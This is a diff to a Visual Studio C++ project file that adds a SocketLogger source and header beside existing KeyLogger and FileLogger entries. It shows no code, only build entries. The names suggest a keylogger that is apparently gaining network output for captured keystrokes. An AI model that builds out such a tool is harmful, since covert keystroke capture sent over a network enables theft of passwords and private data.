@@ -155,11 +155,13 @@
     <ClCompile Include="FileLogger.cpp" />
     <ClCompile Include="KeyLogger.cpp" />
     <ClCompile Include="main.cpp" />
+    <ClCompile Include="SocketLogger.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="FileLogger.h" />
     <ClInclude Include="KeyLogger.h" />
     <ClInclude Include="Logger.h" />
+    <ClInclude Include="SocketLogger.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
